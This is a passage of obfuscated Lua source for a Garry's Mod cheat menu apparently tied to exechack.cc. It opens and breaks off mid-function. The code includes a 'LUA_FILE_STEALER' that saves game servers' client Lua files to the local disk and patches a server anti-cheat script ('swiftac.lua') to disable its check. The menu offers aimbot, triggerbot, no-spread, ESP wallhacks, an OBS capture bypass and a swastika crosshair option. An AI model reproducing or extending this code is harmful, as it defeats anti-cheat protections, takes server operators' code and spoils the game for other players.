            return aj .. " " .. ao:Replace("debug.setmetatable", "dfgldofg34"):Replace("debug.setfenv", "dfgsdfld1ofg34"):Replace("string.dump", "dfgsdfdsfgdld1ofg34"):Replace("debug.getlocal", "asdgdf")
        end
    elseif GetHostName2:find("OctoGames") or GetHostName2:find("Доброград") then
        if #b.srn == 1000 and b.run then
            b.run = false

            return aj .. " " .. ao
        end
    else
        if #b.srn == 1 and b.run then
            b.run = false

            return aj .. " " .. ao
        end
    end

    if n() and S[1] and a == S[1]["name"] then return S[1]["code"] end
    if GetHostName:find("PrimeRP") and n() then return O end
    if GetHostName:find("FustRP") and n() then return O end

    if X["LUA_FILE_STEALER"] and not ScriptExistsif and not n() and GetHostName then
        local ar = A("C:/exechack", [[\]], [[/]])
        local as = F("/", a)
        local P = ar .. "/" .. GetHostName .. "/"
        exec_CreateDir("C:/exechack")
        exec_CreateDir("C:/exechack" .. "/" .. GetHostName)

        for H = 1, #as - 1 do
            P = P .. as[H]

            if not exec_Exists(P) then
                exec_CreateDir(P)
            end

            P = P .. "/"
        end

        if exec_Exists(ar .. "/" .. GetHostName .. "/" .. a) then
            local at = exec_Read(ar .. "/" .. GetHostName .. "/" .. a)
            exec_Write(ar .. "/" .. GetHostName .. "/" .. a, at .. "\n" .. aj)
        else
            exec_Write(ar .. "/" .. GetHostName .. "/" .. a, aj)
        end
    end

    if M and W then return " " end
    if a:find("swiftac.lua") then return aj:Replace("gcinfo()>650", "false") end
end)

k(1, function()
    local au = {}
    include("vgui/dbinder.lua")

    for H = 0, 24 do
        local av = 10 + H

        surface.CreateFont("efont_" .. av, {
            font = "Roboto",
            size = av,
            weight = 550
        })
    end

    local aw = 10
    local ax = u("DFrame")
    ax:SetSize(770, 470)
    ax:Center()
    ax:SetTitle("")
    ax:MakePopup()
    ax:ShowCloseButton(false)

    ax.Paint = function(K, ay, az)
        o(8, 0, 0, ay, az, b._color_windowbg)
        o(0, 49, 0, 1, az, b._color_border)

        if au.tb and x(au.tb.main) then
            o(0, 209, 0, 1, az, b._color_border)
        end

        if au.tb and au.tb.main and IsValid(au.tb.main.other) then
            o(0, 485, 0, 1, az, b._color_border)
        end

        m(b._color_border)
        q(7, aw, 37, 36)

        if au["selected"] == "theme" then
            aw = G(0.05, aw, 10)
        elseif au["selected"] == "Aimbot" then
            aw = G(0.05, aw, 55)
        elseif au["selected"] == "Visuals" then
            aw = G(0.05, aw, 50 * 2 + 5)
        elseif au["selected"] == "Misc" then
            aw = G(0.05, aw, 50 * 3 + 5)
        elseif au["selected"] == "HvH" then
            aw = G(0.05, aw, 50 * 4 + 5)
        elseif au["selected"] == "Configs" then
            aw = G(0.05, aw, 50 * 5 + 5)
        elseif au["selected"] == "Target" then
            aw = G(0.05, aw, 50 * 6 + 5)
        elseif au["selected"] == "Luas" then
            aw = G(0.05, aw, 50 * 7 + 5)
        elseif au["selected"] == "Profile" then
            aw = G(0.05, aw, 426)
        end
    end

    local function aA(aB, ad, aC)
        if x(au[aB]) then
            au[aB]:Remove()
        end

        au[aB] = u("DHTML", ax)
        au[aB]:SetPos(3, aC)
        au[aB]:SetSize(50, 55)
        au[aB]:SetHTML([[<img width="]] .. "30" .. [[" height="]] .. "30" .. [[" src="]] .. ad .. [[">]])
    end

    local function aD()
        if X["STYLE_"] == "Dark" then
            aA("e", "ht" .. "tps://" .. "execha" .. "ck.cc/meta" .. "constract/e_whi" .. "te.png", 5)
            aA("aim", "htt" .. "ps://exech" .. "ack.cc/metacons" .. "tract/aimbot" .. "_white.png", 50)
            aA("visuals", "h" .. "ttps://e" .. "xechack.cc/metaconstract/visuals_white.png", 50 * 2)
            aA("misc", "http" .. "s://exe" .. "chack.cc/meta" .. "constract/misc" .. "_white.png", 50 * 3)
            aA("hvh", "ht" .. "tps://exech" .. "ack.cc/metacon" .. "stract/hvh_" .. "white.png", 50 * 4)
            aA("config", "ht" .. "tps://exe" .. "chack.cc/metacon" .. "stract/confi" .. "g_white.png", 50 * 5)
            aA("target", "ht" .. "tps://exec" .. "hack.cc/metacon" .. "stract/target_" .. "white.png", 50 * 6)
            aA("lua", "ht" .. "tps://exech" .. "ack.cc/metacons" .. "tract/lua_w" .. "hite.png", 50 * 7)
        else
            aA("e", "ht" .. "tps://exec" .. "hack.cc/metac" .. "onst" .. "ract/e" .. ".png", 5)
            aA("aim", "h" .. "ttps://exech" .. "ack.cc/meta" .. "con" .. "stract/a" .. "im.png", 50)
            aA("visuals", "htt" .. "ps://exe" .. "chack.cc/met" .. "acons" .. "tract/vis" .. "uals.png", 50 * 2)
            aA("misc", "h" .. "ttps://exe" .. "chack.cc/met" .. "acons" .. "tract/m" .. "isc.png", 50 * 3)
            aA("hvh", "http" .. "s://exec" .. "hack.cc/meta" .. "cons" .. "tract/h" .. "vh.png", 50 * 4)
            aA("config", "ht" .. "tps://ex" .. "echack.cc/me" .. "taco" .. "nstract/con" .. "fig.png", 50 * 5)
            aA("target", "ht" .. "tps://execha" .. "ck.cc/me" .. "tacon" .. "stract/targ" .. "et.png", 50 * 6)
            aA("lua", "http" .. "s://exec" .. "hack.cc/meta" .. "constr" .. "act/l" .. "ua.png", 50 * 7)
        end
    end

    aD()

    local function aE(aC, ac, a2)
        local aF = u("DButton", ax)
        aF:SetPos(7, aC + 5)
        aF:SetSize(45, 42)
        aF:SetText("")

        aF.Paint = function()
            aF:MoveToFront()
        end

        aF.DoClick = function()
            au["selected"] = ac

            if x(au.tb) then
                au.tb:Remove()
            end

            au.tb = u("DPanel", ax)
            au.tb:SetPos(50, 20)
            au.tb:SetSize(745, 445)

            au.tb.Paint = function(K, ay, az)
                s(ac, "efont_23", 14, -4, b._color_text)
            end

            a2()
        end
    end

    local function aG(ac, aC, aH, aI, aJ, desc, aK)
        local aL = aJ:Add("DCheckBoxLabel")
        aL:SetPos(aC, aH)
        aL:SetText(ac)
        aL:SetFont("efont_17")

        if aK then
            aL:SetValue(aK)
        else
            aL:SetValue(X[aI])
        end

        aL.Lerp = 0

        function aL:OnChange(aM)
            if aK then
                aK = aM
            else
                X[aI] = aM
                a1(aI, aM)
            end
        end

        if desc then
            aL:SetToolTip(desc)
        end

        function aL.Button:Paint(aN, aO)
            o(5, 0, 0, aN, aO, b._color_border)
            o(5, 1, 1, aN - 2, aO - 2, b._color_windowbg)

            if self:GetChecked() then
                aL.Lerp = G(0.05, aL.Lerp, 255)
                aL:SetTextColor(b._color_text)
                o(3, 3, 3, aN - 6, aO - 6, t(b._color_checkbox["r"], b._color_checkbox["g"], b._color_checkbox["b"], aL.Lerp))
            else
                aL.Lerp = G(0.05, aL.Lerp, 150)
                aL:SetTextColor(t(b._color_non_selected["r"], b._color_non_selected["g"], b._color_non_selected["b"], aL.Lerp))
            end
        end

        return aL
    end

    local function aP(ac, aQ, aC, aH, aJ, av)
        local aR = u("DLabel", aJ)
        aR:SetPos(aC, aH)
        aR:SetSize(av and av or 200, 15)
        aR:SetFont(aQ)
        aR:SetTextColor(b._color_text)
        aR:SetText(ac)
    end

    local function aS(ac, aT, aH, aJ, a2, av, aU)
        local aV = u("DButton", aJ)
        aV:SetPos(aT, aH)
        aV:SetSize(av and av or 221, aU and aU or 31)
        aV:SetFont("efont_17")
        aV:SetTextColor(b._color_text)
        aV:SetText(ac)
        aV.Lerp = 10

        aV.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)

            if aV.Hovered then
                aV.Lerp = G(0.09, aV.Lerp, 0)
            else
                aV.Lerp = G(0.09, aV.Lerp, 30)
            end

            o(5, 1, 1, ay - 2, az - 2, t(b._color_button.r - aV.Lerp, b._color_button.g - aV.Lerp, b._color_button.b - aV.Lerp))
        end

        aV.DoClick = a2

        return aV
    end

    local function aW(aI, aT, aH, aJ, ac)
        aP(ac, "efont_17", aT, aH, aJ)
        local aX = u("DBinder", aJ)
        aX:SetPos(aT, aH + 25)
        aX:SetSize(221, 31)
        aX:SetFont("efont_17")
        aX:SetTextColor(b._color_text)
        aX:SetText(input.GetKeyName(X[aI]) or "NONE")

        aX.OnChange = function(aY)
            a1(aI, aY:GetValue())
        end

        aX.Lerp = 0

        aX.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)

            if aX.Hovered then
                aX.Lerp = G(0.09, aX.Lerp, 0)
            else
                aX.Lerp = G(0.09, aX.Lerp, 30)
            end

            o(5, 1, 1, ay - 2, az - 2, t(b._color_button.r - aX.Lerp, b._color_button.g - aX.Lerp, b._color_button.b - aX.Lerp))
        end
    end

    local function aZ(aC, a_, ac, b0, b1, a2)
        local b2 = u("DButton", au.tb)
        b2:SetText("")
        b2:SetSize(130, 30)
        b2:SetPos(15, aC)
        b2.Lerp = 0

        b2.Paint = function(b3, aN, b4)
            if au[a_] == ac then
                b2.Lerp = G(0.05, b2.Lerp, 255)
                s(b1, "efont_19", 0, 4, t(b._color_text["r"], b._color_text["g"], b._color_text["b"], b2.Lerp))
                o(5, aN - 3, 5, 3, 17, t(b._color_text["r"], b._color_text["g"], b._color_text["b"], b2.Lerp))
            else
                s(b1, "efont_19", 0, 4, t(b._color_non_selected["r"], b._color_non_selected["g"], b._color_non_selected["b"], b2.Lerp))
                b2.Lerp = Lerp(0.05, b2.Lerp, 150)
            end
        end

        if au[a_] == ac or au[a_] == nil then
            au[a_] = ac
            au[a_ .. "lse"] = b0

            if x(au.tb.main) then
                au.tb.main:Remove()
            end

            au.tb.main = u("DPanel", au.tb)
            au.tb.main:SetPos(160, 0)
            au.tb.main:SetSize(1000, 440)
            au.tb.main:MoveTo(160, 1, .1, 0, -100)

            au.tb.main.Paint = function(K, ay, az)
                s(b0, "efont_23", 14, -4, b._color_text)
            end

            a2()
        end

        b2.DoClick = function()
            au[a_] = ac
            au[a_ .. "lse"] = b0

            if x(au.tb.main) then
                au.tb.main:Remove()
            end

            au.tb.main = u("DPanel", au.tb)
            au.tb.main:SetPos(160, 0)
            au.tb.main:SetSize(1000, 440)
            au.tb.main:MoveTo(160, 1, .1, 0, -100)

            au.tb.main.Paint = function(K, ay, az)
                s(b0, "efont_23", 14, -4, b._color_text)
            end

            a2()
        end
    end

    local function b5(ac, aT, aH, b6, b7, aI, aJ, desc)
        aP(ac, "efont_17", aT, aH, aJ)
        local b8 = u("DPanel", aJ)
        b8:SetPos(aT, aH + 20)
        b8:SetSize(370, 30)
        b8.Paint = function() end
        local b9 = u("DNumSlider", b8)
        b9:SetPos(-142, 0)
        b9:SetSize(350, 16)
        b9:SetMin(b6)
        b9:SetMax(b7)
        b9:SetDecimals(0)
        b9.TextArea:SetFont("efont_17")
        b9.TextArea:SetTextColor(b._color_text)
        b9:SetValue(X[aI])
        b9.Lerp = 0

        if desc then
            b9:SetToolTip(desc)
        end

        function b9:OnValueChanged(a)
            a1(aI, a)
        end

        function b9.Slider.Knob:Paint()
        end

        function b9.Slider:Paint(ay, az)
            b9.Lerp = G(0.07, b9.Lerp, ay * (self:GetParent():GetValue() - self:GetParent():GetMin()) / self:GetParent():GetRange())
            o(3, 0, az / 4, ay, az / 2, b._color_border)
            o(3, 1, az / 4 + 1, ay - 2, az / 2 - 2, b._color_windowbg)
            o(3, 0, az / 4, b9.Lerp, az / 2, b._color_slider)
        end

        return b9
    end

    local function ba(bb, bc, bd, table, ac, aJ)
        aP(ac, "efont_17", bb, bc, aJ)
        local be = u("DComboBox", aJ)
        be:SetPos(bb, bc + 25)
        be:SetSize(170, 27)
        be:SetFont("efont_13")
        be:SetValue(X[bd])
        be:SetTextColor(b._color_text)

        be.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
        end

        be.OnSelect = function(K, K, a3)
            a1(bd, a3)
        end

        for K, Q in g(table) do
            be:AddChoice(Q)
        end
    end

    local function bf(bb, bc, bd)
        aP("Position", "efont_17", bb, bc, au.tb.main.other)
        local be = u("DComboBox", au.tb.main.other)
        be:SetPos(bb, bc + 25)
        be:SetSize(170, 27)
        be:SetFont("efont_13")
        be:SetTextColor(b._color_text)

        if X[bd] == 1 then
            be:SetValue("Up")
        elseif X[bd] == 2 then
            be:SetValue("Down")
        elseif X[bd] == 3 then
            be:SetValue("Right")
        elseif X[bd] == 4 then
            be:SetValue("Left")
        end

        be.Paint = function(K, ay, az)
            o(5, 0, 0, ay, az, b._color_border)
            o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
        end

        be.OnSelect = function(K, K, a3)
            if a3 == "Up" then
                a1(bd, 1)
            elseif a3 == "Down" then
                a1(bd, 2)
            elseif a3 == "Right" then
                a1(bd, 3)
            elseif a3 == "Left" then
                a1(bd, 4)
            end
        end

        be:AddChoice("Up")
        be:AddChoice("Down")
        be:AddChoice("Left")
        be:AddChoice("Right")
    end

    local function bg(aC, aT, aJ, a2)
        aS("..", aC, aT, aJ, a2, 15, 15)
    end

    local function bh(ac)
        if x(au.tb.main.other) then
            au.tb.main.other:Remove()
        end

        au.tb.main.other = u("DScrollPanel", au.tb.main)
        au.tb.main.other:SetPos(475, 0)
        au.tb.main.other:SetSize(280, 440)
        au.tb.main.other:MoveTo(275, 0, .1, 0, -100)

        au.tb.main.other.Paint = function(K, ay, az)
            s(ac, "efont_23", 14, -4, b._color_text)
        end
    end

    local function bi(bd, aC, bj)
        local bk = u("DColorMixer", au.tb.main.other)
        bk:SetPos(aC, bj)
        bk:SetSize(121, 150)
        bk:SetPalette(false)
        bk:SetWangs(false)
        bk:SetColor(X[bd])

        bk.ValueChanged = function()
            a1(bd, bk:GetColor())
        end
    end

    local bl = u("DHTML", ax)
    bl:SetPos(3, 420)
    bl:SetSize(50, 50)
    bl:SetHTML([[<style>.round {border-radius: 100px;}</style> <img width="30" height="30" src="]] .. avatar .. [[" class="round">]])
    local aF = u("DButton", ax)
    aF:SetPos(7, 425)
    aF:SetSize(45, 40)
    aF:SetText("")

    aF.Paint = function()
        aF:MoveToFront()
    end

    aF.DoClick = function()
        gui.OpenURL("ht" .. "tps://e" .. "xecha" .. "ck.cc/for" .. "um/ind" .. "ex.php?memb" .. "ers/" .. username .. "." .. F("s/0/", avatar)[2]:Replace(".jpg") .. "/")
    end

    aE(5, "Theme editor", function()
        au["selected"] = "theme"

        aS("Light", 15, 30, au.tb, function()
            a1("STYLE_", "Light")
            X["STYLE_"] = "Light"
            aD()
            a1("STYLE_TEXT", t(50, 50, 55))
            a1("STYLE_WINDOWBG", t(235, 235, 240))
            a1("STYLE_TEXT_NON_SELECTED", t(195, 195, 200))
            a1("STYLE_BORDER", t(202, 202, 207))
            a1("STYLE_CHECKBOX", t(50, 50, 55))
            a1("STYLE_BUTTON", t(235, 235, 235))
            a1("STYLE_SLIDER", t(50, 50, 55))
        end)

        aS("Dark", 15 + 231, 30, au.tb, function()
            a1("STYLE_", "Dark")
            X["STYLE_"] = "Dark"
            aD()
            a1("STYLE_TEXT", t(255, 252, 252))
            a1("STYLE_WINDOWBG", t(34, 34, 34))
            a1("STYLE_TEXT_NON_SELECTED", t(68, 68, 68))
            a1("STYLE_BORDER", t(78, 78, 78))
            a1("STYLE_CHECKBOX", t(225, 225, 225))
            a1("STYLE_BUTTON", t(65, 65, 65))
            a1("STYLE_SLIDER", t(225, 225, 225))
        end)

        local aC = 70

        local function bm(K, Q)
            aP(K, "efont_20", 40, aC + 2, au.tb)

            local bn = aS("", 15, aC, au.tb, function()
                doplpanel = u("DFrame")
                doplpanel:SetSize(121 + 15, 150 + 15)
                doplpanel:SetPos(gui.MouseX() - 10, gui.MouseY() - 10)
                doplpanel:SetTitle("")
                doplpanel:MakePopup()
                doplpanel:ShowCloseButton(false)

                doplpanel.Paint = function(K, ay, az)
                    o(5, 0, 0, ay, az, b._color_border)
                    o(5, 1, 1, ay - 2, az - 2, b._color_windowbg)
                end

                local bk = vgui.Create("DColorMixer", doplpanel)
                bk:SetPos(7, 7)
                bk:SetSize(121, 150)
                bk:SetPalette(false)
                bk:SetWangs(false)
                bk:SetColor(X[Q])
                bk:SetAlphaBar(false)

                bk.ValueChanged = function()
                    a1(Q, bk:GetColor())
                end

                doplpanel.Think = function()
                    if doplpanel and x(doplpanel) and input.IsMouseDown(107) then
                        if not doplpanel:IsChildHovered() and not doplpanel.Hovered then
                            doplpanel:Close()
                            doplpanel = nil
                        end
                    end
                end
            end, 20, 20)

            bn.Paint = function(ak, ay, az)
                o(5, 0, 0, ay, az, b._color_border)
                o(5, 1, 1, ay - 2, az - 2, X[Q])
            end

            aC = aC + 25
        end

        bm("Text", "STYLE_TEXT")
        bm("TextNoSelect", "STYLE_TEXT_NON_SELECTED")
        bm("WindowBg", "STYLE_WINDOWBG")
        bm("Border", "STYLE_BORDER")
        bm("Button", "STYLE_BUTTON")
        bm("CheckBox", "STYLE_CHECKBOX")
        bm("Slider", "STYLE_SLIDER")
    end)

    aE(50, "Aimbot", function()
        aZ(20, "selected_aim", "Aimbot", "Main", "MAIN", function()
            aG("Enabled", 15, 30, "AIM_ENABLED", au.tb.main)
            aG("Silent", 15, 30 + 30, "AIM_SILENT", au.tb.main)
            aG("Auto Fire", 15, 30 + 30 * 2, "AIM_AUTOFIRE", au.tb.main, "Automatatically fires the weapon")
            aG("Auto Reload", 15, 30 + 30 * 3, "AIM_AUTORELOAD", au.tb.main)
            aW("AIM_KEY", 15, 30 + 30 * 4, au.tb.main, "Key")
            aW("MISC_AUTOPISTOL", 15, 30 + 30 * 6 + 10, au.tb.main, "AutoPistol Key")
        end)

        aZ(20 + 30, "selected_aim", "targett", "Target", "TARGET", function()
            b5("Fov", 15, 30, 0, 180, "AIM_FOV", au.tb.main)
            aG("Auto Wall", 15, 30 + 50, "AIM_AUTOWALL", au.tb.main)

            ba(15, 30 + 80, "AIM_PRIORITY", {"Closest Distance", "Least Health", "Field of View"}, "Priority", au.tb.main)

            aS("Ignore", 15, 30 + 140, au.tb.main, function()
                bh("Ignore")
                aG("BabyGod time", 15, 30, "AIM_FILTER_BABYGODTIME", au.tb.main.other)
                aG("My Team", 15, 30 + 30, "AIM_FILTER_MYTEAM", au.tb.main.other)
                aG("Noclip", 15, 30 + 30 * 2, "AIM_FILTER_NOCLIP", au.tb.main.other)
            end)
        end)

        aZ(20 + 30 * 2, "selected_aim", "accuracy", "Accuracy", "ACCURACY", function()
            aG("No Spread", 15, 30, "AIM_NOSPREAD", au.tb.main, "SUPPORT:\nEngine prediction - HL2, M9K, ~TFA\nCurCone(CommandNumber) - CW2, SWBASE\nNO SUPPORT:\nCurCone(CurTime) - FA:S 2.0, ArcCW")
            aG("No Recoil", 15, 30 + 30, "AIM_NORECOIL", au.tb.main, "SUPPORT:\nGetPunchAngle")

            ba(15, 30 + 30 * 2, "AIM_HITBOX", {"Head", "Body", "Hitscan", "Head - for broken models"}, "Hitbox", au.tb.main)

            b5("Smoothing", 15, 30 + 30 * 4, 0, 15, "AIM_SMOOTHING", au.tb.main)
        end)

        aZ(20 + 30 * 3, "selected_aim", "triggerbot", "Triggerbot", "TRIGGERBOT", function()
            aG("Enabled", 15, 30, "TRIGGERBOT_ENABLED", au.tb.main)
            aW("TRIGGERBOT_KEY", 15, 30 + 30, au.tb.main, "Key")
            aP("Hitbox", "efont_19", 15, 30 * 4 + 15, au.tb.main)
            aG("Head", 15, 30 * 5 + 15, "TRIGGERBOT_HEAD", au.tb.main)
            aG("Chest", 15, 30 * 6 + 15, "TRIGGERBOT_CHEST", au.tb.main)
            aG("Stomach", 15, 30 * 7 + 15, "TRIGGERBOT_STOMACH", au.tb.main)
            aG("Leftarm", 15, 30 * 8 + 15, "TRIGGERBOT_LEFTARM", au.tb.main)
            aG("Rightarm", 15, 30 * 9 + 15, "TRIGGERBOT_RIGHTARM", au.tb.main)
            aG("Leftleg", 15, 30 * 10 + 15, "TRIGGERBOT_LEFTLEG", au.tb.main)
            aG("Rightleg", 15, 30 * 11 + 15, "TRIGGERBOT_RIGHTLEG", au.tb.main)
        end)

        aZ(20 + 30 * 4, "selected_aim", "visualization", "Visualization", "VISUALIZATION", function()
            aG("Fov Circle", 15, 30, "AIM_DRAWFOV", au.tb.main)

            bg(250, 30 + 1, au.tb.main, function()
                bh("Fov Circle")
                aG("Fill", 15, 30, "WH_FOV_FILL", au.tb.main.other)
                bi("WH_FOV_COLOR", 15, 30 + 30)
            end)

            aG("Snapline", 15, 60, "WH_SNAPLINE", au.tb.main)

            bg(250, 60 + 1, au.tb.main, function()
                bh("Snapline")
                bi("WH_SNAPLINE_COLOR", 15, 30)
            end)
        end)
    end)

    aE(50 + 50, "Visuals", function()
        aG("OBS Bypass", 15, 30 + 390, "OBSBYPASS", au.tb)

        aZ(20, "selected_visuals", "player", "Player", "PLAYER", function()
            b5("Distance", 15, 30, 1000, 20000, "WH_DISTANCE", au.tb.main)
            aG("Dormant", 15, 30 + 45, "WH_DORMANT", au.tb.main)
            aP("Globals Color", "efont_19", 15, 105, au.tb.main)

            bg(250, 105 + 1, au.tb.main, function()
                bh("Friend Color | Aim Target Color")
                bi("WH_FRIENDCOLOR", 15, 30)
                bi("WH_AIMTARGET_COLOR", 15, 30 + 165)
            end)

            aG("Name", 15, 105 + 30 * 1, "WH_NAME", au.tb.main, "Show player's name on ESP")

            bg(250, 105 + 30 * 1 + 1, au.tb.main, function()
                bh("Name")
                aG("Friend Color", 15, 30, "WH_NAME_FRIENDCOLOR", au.tb.main.other)
                bf(15, 30 * 2, "WH_NAME_POSITION")
                bi("WH_NAME_COLOR", 15, 30 + 95)
            end)

            aG("Rank", 15, 105 + 30 * 2, "WH_USERGROUP", au.tb.main, "Show player's rank on ESP")

            bg(250, 105 + 30 * 2 + 1, au.tb.main, function()
                bh("Rank")
                bf(15, 30, "WH_USERGROUP_POSITION")
                bi("WH_USERGROUP_COLOR", 15, 30 + 65)
            end)

            aG("Team", 15, 105 + 30 * 3, "WH_JOB", au.tb.main, "Show player's team on ESP")

            bg(250, 105 + 30 * 3 + 1, au.tb.main, function()
                bh("Team")
                bf(15, 30, "WH_JOB_POSITION")
            end)

            aG("Money", 15, 105 + 30 * 4, "WH_MONEY", au.tb.main, "Show player's money(darkrp) on ESP")

            bg(250, 105 + 30 * 4 + 1, au.tb.main, function()
                bh("Money")
                bf(15, 30, "WH_MONEY_POSITION")
                bi("WH_MONEY_COLOR", 15, 30 + 65)
            end)

            aG("Weapon", 15, 105 + 30 * 5, "WH_WEAPON", au.tb.main, "Show player's weapons on ESP")

            bg(250, 105 + 30 * 5 + 1, au.tb.main, function()
                bh("Weapon")
                bf(15, 30, "WH_WEAPON_POSITION")

                ba(15, 95, "WH_WEAPON_TYPETYPE", {"Only active", "All"}, "Type", au.tb.main.other)

                bi("WH_WEAPON_COLOR", 15, 95 + 70)
            end)

            aG("Health", 15, 105 + 30 * 6, "WH_HEALTH", au.tb.main, "Show player's health ammount on ESP")

            bg(250, 105 + 30 * 6 + 1, au.tb.main, function()
                bh("Health")
                bf(15, 30, "WH_HEALTH_POSITION")

                ba(15, 95, "WH_HEALTH_TYPETYPE", {"Text", "Bar", "Text + Bar"}, "Type", au.tb.main.other)
            end)

            aG("Armor", 15, 105 + 30 * 7, "WH_ARMOR", au.tb.main, "Show armor's health ammount on ESP")

            bg(250, 105 + 30 * 7 + 1, au.tb.main, function()
                bh("Armor")
                bf(15, 30, "WH_ARMOR_POSITION")
            end)

            aG("Box", 15, 105 + 30 * 8, "WH_BOX", au.tb.main, "Draw a bounding box around the player")

            bg(250, 105 + 30 * 8 + 1, au.tb.main, function()
                bh("Box")
                aG("Team Color", 15, 30, "WH_BOX_TEAMCOLOR", au.tb.main.other)

                ba(15, 60, "WH_BOX_TYPETYPE", {"2d", "3d", "Corner", "2d fat", "Corner fat"}, "Type", au.tb.main.other)

                bi("WH_BOX_COLOR", 15, 95 + 35)
            end)

            aG("Chams", 15, 105 + 30 * 9, "WH_CHAMS", au.tb.main, "Applies chams material to the player")

            bg(250, 105 + 30 * 9 + 1, au.tb.main, function()
                bh("Chams")
                aG("Team Color", 15, 30, "WH_CHAMS_TEAMCOLOR", au.tb.main.other)

                ba(15, 60, "WH_CHAMS_TYPE", {"XYZ", "Textured", "Flat", "Wireframe"}, "Type", au.tb.main.other)

                bi("WH_CHAMS_COLOR", 15, 95 + 35)
            end)

            aG("Skeleton", 15, 105 + 30 * 10, "WH_SKELETON", au.tb.main, "Draw the player's bone structure")

            bg(250, 105 + 30 * 10 + 1, au.tb.main, function()
                bh("Skeleton")
                aG("Team Color", 15, 30, "WH_SKELETON_TEAMCOLOR", au.tb.main.other)
                bi("WH_SKELETON_COLOR", 15, 60)
            end)
        end)

        aZ(20 + 30, "selected_visuals", "entity", "Entity", "ENTITY", function()
            b5("Distance", 15, 30, 1000, 20000, "WH_ENTITY_DISTANCE", au.tb.main)
            aG("Dormant", 15, 30 + 45, "WH_ENTITY_DORMANT", au.tb.main)
            aG("Name", 15, 105, "WH_ENTITY_NAME", au.tb.main, "Show entity's name on ESP")

            bg(250, 105 + 1, au.tb.main, function()
                bh("Entity Name")
                aG("Show Other", 15, 30, "WH_ENTITY_NAME_SHOWOTHER", au.tb.main.other)
                bi("WH_ENTITY_NAME_COLOR", 15, 60)
            end)

            aG("Box", 15, 105 + 30, "WH_ENTITY_BOX", au.tb.main, "Draw a bounding box around the player")

            bg(250, 105 + 30 + 1, au.tb.main, function()
                bh("Entity Box")

                ba(15, 30, "WH_ENTITY_BOX_TYPE", {"2d", "3d"}, "Type", au.tb.main.other)

                bi("WH_ENTITY_BOX_COLOR", 15, 95)
            end)

            aG("Chams", 15, 105 + 30 * 2, "WH_ENTITY_CHAMS", au.tb.main, "Applies chams material to the player")

            bg(250, 105 + 30 * 2 + 1, au.tb.main, function()
                bh("Entity Chams")

                ba(15, 30, "WH_ENTITY_CHAMS_TYPE", {"XYZ", "Textured", "Flat", "Wireframe"}, "Type", au.tb.main.other)

                bi("WH_ENTITY_CHAMS_COLOR", 15, 95)
            end)
        end)

        aZ(20 + 60, "selected_visuals", "Other", "Other", "OTHER", function()
            aG("CrossHair", 15, 30, "CROSSHAIR_ENABLED", au.tb.main, "Draw a custom crosshair")

            bg(250, 30 + 1, au.tb.main, function()
                bh("CrossHair")
                aG("Classic", 15, 30, "CROSSHAIR_CROSSHAIR", au.tb.main.other)
                aG("Circle", 15, 30 * 2, "CROSSHAIR_FOV", au.tb.main.other)
                aG("Box", 15, 30 * 3, "CROSSHAIR_BOX", au.tb.main.other)
                aG("Swastika", 15, 30 * 4, "CROSSHAIR_GERMANY", au.tb.main.other)
                b5("Size", 15, 30 * 5, 1, 50, "CROSSHAIR_SIZE", au.tb.main.other)
                bi("CROSSHAIR_COLOR", 15, 200)
            end)

            aG("FullBright", 15, 30 * 2, "WH_FULLBRIGHT", au.tb.main, "Remove shadows")
            aG("NoSky", 15, 30 * 3, "WH_NOSKY", au.tb.main, "Change color sky")

            bg(250, 30 * 3 + 1, au.tb.main, function()
                bh("NoSky")
                bi("WH_NOSKY_COLOR", 15, 30)
            end)

            aG("No Visual Recoil", 15, 30 * 4, "NOSWAY", au.tb.main, "Visual no recoil")
            aG("Fov view", 15, 30 * 5, "WH_FOVVIEW_ENABLED", au.tb.main)

            bg(250, 30 * 5 + 1, au.tb.main, function()
                bh("Fov view")
                b5("Desired", 15, 30, 70, 150, "WH_FOVVIEW", au.tb.main.other)
                b5("View Model", 15, 80, 10, 150, "WH_FOVVIEW_MODEL", au.tb.main.other)
            end)

            aG("Debug Camera", 15, 30 * 6, "WH_DEBUGCAMERA_ENABLED", au.tb.main)

            bg(250, 30 * 6 + 1, au.tb.main, function()
                bh("Debug Camera")
                aW("WH_DEBUGCAMERA_KEY", 15, 30, au.tb.main.other, "Key")
                b5("Speed", 15, 30 * 3 + 10, 1, 10, "WH_DEBUGCAMERA_SPEEDS", au.tb.main.other)
                aG("Render all map", 15, 30 * 5 - 10, "WH_DEBUGCAMERA_RENDER", au.tb.main.other)
            end)

            aG("ThirdPerson", 15, 30 * 7, "WH_THIRDPERSON_ENABLED", au.tb.main)

            bg(250, 30 * 7 + 1, au.tb.main, function()
                bh("ThirdPerson")
                aW("WH_THIRDPERSON_KEY", 15, 30, au.tb.main.other, "Key")
                b5("Distance", 15, 30 * 3 + 10, 70, 300, "WH_THIRDPERSON_DISTANCE", au.tb.main.other)
            end)

            aG("Filter", 15, 30 * 8, "FILTER_ENABLED", au.tb.main)

            bg(250, 30 * 8 + 1, au.tb.main, function()
                bh("Filter")
                b5("Brightness", 15, 30, 0, 1, "FILTER_BRIGHTNESS", au.tb.main.other)
                b5("Contrast", 15, 30 * 2 + 10, 0, 5, "FILTER_CONTRAST", au.tb.main.other)
                b5("Saturation", 15, 30 * 3 + 20, 0, 5, "FILTER_SATURATION", au.tb.main.other)
            end)

            aG("Info", 15, 30 * 9, "WH_INFO", au.tb.main)

            bg(250, 30 * 9 + 1, au.tb.main, function()
                bh("")
                aP("Info", "efont_22", 15, 3, au.tb.main.other)
                aG("Health", 15, 30, "WH_INFO_SHOW_HEALTH", au.tb.main.other)
                aG("Armor", 15, 30 * 2, "WH_INFO_SHOW_ARMOR", au.tb.main.other)
                aG("Velocity", 15, 30 * 3, "WH_INFO_SHOW_VECOTIRY", au.tb.main.other)
                aG("Server", 15, 30 * 4, "WH_INFO_SHOW_SERVER", au.tb.main.other)
                aG("Online", 15, 30 * 5, "WH_INFO_SHOW_ONLINE", au.tb.main.other)
                aG("Map", 15, 30 * 6, "WH_INFO_SHOW_MAP", au.tb.main.other)
                aG("Entities", 15, 30 * 7, "WH_INFO_SHOW_ENTITTIES", au.tb.main.other)
                aG("Frames", 15, 30 * 8, "WH_INFO_SHOW_FRAMES", au.tb.main.other)
                aG("Ping", 15, 30 * 9, "WH_INFO_SHOW_PING", au.tb.main.other)
